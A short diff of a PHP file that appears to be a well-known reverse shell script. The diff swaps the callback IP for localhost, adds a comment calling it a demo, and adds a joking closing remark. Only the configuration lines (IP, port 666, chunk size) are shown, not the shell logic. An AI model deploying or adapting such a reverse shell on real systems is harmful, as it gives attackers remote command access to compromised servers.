@@ -6,7 +6,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.0.1.12';
+$ip = '127.0.0.1';	//why localhost? that's a demo so...
 $port = 666;
 $chunk_size = 1400;
 $write_a = null;
@@ -145,5 +145,7 @@ function printit ($string) {
 		print "$string\n";
 	}
 }
+
+//Then you have succeeded in understanding what it is all about? XD
 
 ?>
